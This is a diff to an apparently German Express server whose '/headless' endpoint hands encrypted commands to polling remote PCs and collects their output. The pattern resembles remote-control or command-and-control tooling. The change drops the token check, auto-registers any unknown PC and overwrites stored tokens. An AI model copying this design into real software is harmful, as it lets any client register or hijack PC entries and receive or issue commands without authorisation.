@@ -100,12 +100,23 @@ app.get('/headless', (req, res) => {
         return res.status(401).send('Unauthorized');
     }
 
-    if (!registeredTokens[pcId] || registeredTokens[pcId].token !== token) {
-        return res.status(403).send('Forbidden');
+    // AUTO-REGISTRIERUNG: PC noch nicht bekannt? Dann neu anlegen!
+    if (!registeredTokens[pcId]) {
+        registeredTokens[pcId] = {
+            token: token,
+            lastSeen: Date.now(),
+            online: true
+        };
+        console.log(`[AUTO-REG] PC "${pcId}" automatisch registriert`);
     }
 
+    // Token updaten (falls sich geändert hat)
+    registeredTokens[pcId].token = token;
     registeredTokens[pcId].online = true;
     registeredTokens[pcId].lastSeen = Date.now();
+
+    // Heartbeat: PC erscheint jetzt im Dashboard!
+    console.log(`[HEARTBEAT] ${pcId} ist online`);
 
     const command = pcCommands[pcId];
 
@@ -116,12 +127,15 @@ app.get('/headless', (req, res) => {
             res.set('Content-Type', 'text/plain; charset=utf-8');
             res.send(decryptedCommand);
         } catch (e) {
-            res.status(500).send('Entschluesselungsfehler');
+            // Wenn Entschluesselung fehlschlaegt (alter Befehl mit neuem Key), einfach KEIN_BEFEHL senden
+            console.log(`[WARNUNG] Konnte Befehl fuer ${pcId} nicht entschluesseln. Ignorieren.`);
+            res.send('KEIN_BEFEHL');
         }
     } else {
         res.send('KEIN_BEFEHL');
     }
 });
+
 
 // ==================== OUTPUT EMPFANGEN (FIX: nur Base64, kein AES) ====================
 app.post('/output', (req, res) => {
